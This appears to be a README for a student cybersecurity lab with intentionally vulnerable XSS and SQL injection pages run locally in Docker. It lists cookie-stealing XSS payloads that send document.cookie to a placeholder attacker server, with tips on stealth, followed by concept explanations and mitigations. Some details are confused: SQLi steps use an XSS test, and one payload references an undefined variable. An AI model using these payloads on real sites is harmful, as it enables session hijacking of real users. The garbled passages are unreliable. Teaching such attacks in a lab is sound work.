# Internship cyber security course
This repository collects tools and methodologies used in the context of system security intership
## Start the Lab
- Install docker for windows
- Clone\download this repository
- Start docker
- Open a command prompt inside the project root directory and execute the following command:

  		docker compose up --build
		
### For XSS vulnerability
- Visit the vulnerable page at: http://localhost:9000/xss.php

### SQLi vulnerability
- Initialize the SQLite db at: http://localhost:9000/initDB.php. You should get a response with "Done"
- Visit the vulnerable page at: http://localhost:9000/sqlI.php 

## Students
1. Dario Collini
2. Andrea Di Caro
## Analyzed vulnerabilities
- XSS reflected
- XSS stored
- SQL injection

## Payloads
### Reflected
    <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
### Stored
Not the best approach, generates a bunch of requests, very loud

    <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
More stealth, use this one

    <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
	

## TODO: write some SQLi payloads used in the lab


## Vulnerabilities Scenario and actions
### Steps for Vulnerability Analysis

#### 1. Information Gathering:
- **Application Observation**: Analyze the web application to identify points where user input is used to create SQL queries. These may include login forms, search forms, or any other form that interacts with the database.
- **Identifying Vulnerable Parameters**: Identify which parameters (e.g., query string, form fields, cookies) could be vulnerable to SQLi.

#### 2. Injection Testing:
- **Manipulated Input**: Inject various test payloads, such as `<script>alert(0);</script>`. A vulnerable application will run the script and display the alert.
- Once testing confirms vulnerability, the attacker may proceed with one of the following attack types:

---

### SQL Injection

**SQL Injection** occurs when attackers exploit flaws in poorly written PHP code to inject malicious code into a web application, leading to the execution of arbitrary commands on the server.

---

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** occurs when the server or application does not properly sanitize user input, allowing attackers to inject malicious scripts into web pages that will be executed in the browsers of users visiting the page.

#### There are 2 types of Cross-Site Scripting (XSS):
1. **Stored XSS**  
   Stored XSS is a type of Cross-Site Scripting where the malicious script injected by the attacker is stored on the server (e.g., in a database, file, or log).

2. **Reflected XSS**  
   Reflected XSS is a type of Cross-Site Scripting where the malicious code is not stored on the server but is instead reflected immediately in the server's response.

---

### Key Difference in Cookie Theft Methods Between Stored and Reflected XSS:

- **Stored XSS**: In this case, the attacker can redirect the user’s cookie to their own web server, which is always listening. This allows the attacker to steal the cookie every time someone visits the page.
  
- **Reflected XSS**: Here, the attacker needs the user to open a malicious link that leads to a website with a command that allows the attacker to redirect the user’s cookie toward them. This can only be done with some prior social engineering research to trick the user into clicking the link.

---

### Mitigation:

Mitigation refers to the methods we can use to make our websites secure and protected against these types of attacks.

- **Input Sanitization**: Filter user input to remove any malicious HTML or JavaScript tags.
  
- **Output Escaping**: Escape user input before displaying it on the HTML page, meaning converting special characters into sequences that are not interpreted as code by the browser.

- **Setting a Content Security Policy (CSP)**: Use a CSP to limit executable resources in the browser (such as scripts and styles) and prevent the execution of unauthorized scripts.


